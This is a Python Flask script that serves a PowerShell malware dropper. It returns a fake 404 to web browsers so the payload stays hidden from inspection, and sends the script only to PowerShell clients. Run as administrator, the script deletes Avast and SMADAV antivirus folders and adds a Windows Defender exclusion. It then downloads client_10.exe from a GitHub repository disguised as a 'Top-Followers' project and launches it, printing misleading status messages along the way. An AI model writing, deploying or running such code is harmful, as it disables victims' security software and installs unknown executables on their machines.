from flask import Flask, Response, request
import os

app = Flask(__name__)

@app.route('/')
def direct_command():
    # 1. Identify the visitor
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # 2. If it's a browser (Chrome, Edge, Safari, etc.), show a fake 404 error
    if 'mozilla' in user_agent and 'powershell' not in user_agent:
        # This returns an empty page with a 404 "Not Found" status
        return Response("Not Found", status=404, mimetype='text/plain')

    # 3. If it's PowerShell, send the script
    ps_content = """
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "--- JAILBREAK-1: ADMIN ACTIVE ---" -ForegroundColor Green
    Write-Host "Ready for deployment. it will take a while .....(2 minutes)" -ForegroundColor Cyan
    
    $targetFolders = @(
        "C:\\Program Files\\Avast Software",
        "C:\\Program Files (x86)\\SMADAV",
        "C:\\Program Files\\SMADAV"
    )

    foreach ($folder in $targetFolders) {
        if (Test-Path -Path $folder) {
            Write-Host "Found: $folder - Attempting removal..." -ForegroundColor Cyan
            Remove-Item -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    $filePath = "$HOME\\client_10.exe"
    if (-not (Test-Path $filePath)) {
        Write-Host "Initialing system components..." -ForegroundColor Cyan
        Add-MpPreference -ExclusionPath $filePath
        Invoke-WebRequest -Uri "https://github.com/jembex/Top-Followers/raw/refs/heads/main/client_10.exe" -OutFile $filePath
    }

    if (Test-Path $filePath) {
        Start-Process $filePath
        Write-Host "Success: Process started." -ForegroundColor Green
    }
} else {
    Write-Host "--- ACCESS DENIED ---" -ForegroundColor Red
    Write-Host "Please run PowerShell as Administrator." -ForegroundColor Yellow
}
"""
    return Response(ps_content, mimetype='text/plain')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
